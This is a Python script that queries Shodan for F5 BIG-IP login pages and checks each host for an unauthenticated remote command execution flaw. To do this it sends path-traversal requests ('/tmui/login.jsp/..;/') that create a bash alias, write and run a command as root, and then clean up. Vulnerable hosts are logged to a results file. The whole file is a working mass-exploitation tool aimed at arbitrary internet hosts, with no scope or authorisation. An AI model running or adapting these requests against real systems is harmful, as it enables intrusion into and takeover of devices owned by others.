#!/usr/bin/env python3
import re
import sys
import requests
from time import sleep
from shodan import Shodan
from datetime import datetime
from threading import Thread, activeCount

# Shodan API Key (change according to your Shodan API key)
api_key = ''
# Shodan search query
search_query = 'http.title:"BIG-IP&reg;- Redirect"'


def getTime():
    now = datetime.now()
    return now.strftime('%H:%M:%S')


def showInfo(message):
    print('[\033[1;94m{}\033[0;m] [*] {}'.format(getTime(), message))


def showFail(message):
    print('[\033[1;94m{}\033[0;m] [\033[1;91m-\033[0;m] \033[1;91m{}\033[0;m'.format(getTime(), message))


def showSuccess(message):
    print('[\033[1;94m{}\033[0;m] [\033[1;92m+\033[0;m] \033[1;92m{}\033[0;m'.format(getTime(), message))


def exit(message = None):
    try:
        if message is not None:
            showFail(message)
        if activeCount() > 1:
            showInfo('Killing all threads')
            while activeCount() > 1:
                sleep(0.001)
        showInfo('Exiting script')
        sys.exit()
    except KeyboardInterrupt:
        pass


def check(ip, port):
    try:
        url1 = 'https://{}:{}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=create+cli+alias+private+list+command+bash'
        url2 = 'https://{}:{}/tmui/login.jsp/..;/tmui/locallb/workspace/fileSave.jsp?fileName=/tmp/cmd&content=id'
        url3 = 'https://{}:{}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+/tmp/cmd'
        url4 = 'https://{}:{}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=delete+cli+alias+private+list'

        requests.get(url1.format(ip, port), verify=False, timeout=5)
        requests.get(url2.format(ip, port), verify=False, timeout=5)

        r = requests.get(url3.format(ip, port), verify=False, timeout=5)

        if 'uid=0(root)' in r.text:
            r = requests.get('https://{}:{}/tmui/login.jsp'.format(ip, port), verify=False, timeout=5)
            hostname = re.search(r'<p\stitle=\"(.*?)\">', r.text).group(1).strip().lower()
            showSuccess('{} : {} - {} is vulnerable!'.format(ip, port, hostname))
            with open('result.txt', 'a+') as f:
                f.write('{}:{}  - {}\n'.format(ip, port, hostname))
                f.close()
        else:
            showFail('{} : {} is not vulnerable'.format(ip, port))

        requests.get(url4.format(ip, port), verify=False, timeout=5)
    except KeyboardInterrupt:
        exit('User aborted!')
    except Exception as e:
        showFail('{} : {} is not vulnerable'.format(ip, port))


def main():
    try:
        api = Shodan(api_key)
        showInfo('Querying from Shodan API')
        showInfo('Using query: {}'.format(search_query))
        search = api.search_cursor(search_query)
        showInfo('Retrieved result from Shodan')
        showInfo('Starting scanning')
        for result in search:
            ip = result['ip_str'].strip()
            port = result['port']
            th = Thread(target=check, args=(ip, port,))
            th.daemon = True
            th.start()
            while activeCount() > 5:
                sleep(0.001)
        while activeCount() > 1:
            sleep(0.001)
        exit('Scan ended')
    except Exception as e:
        exit(e)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit('User aborted!')

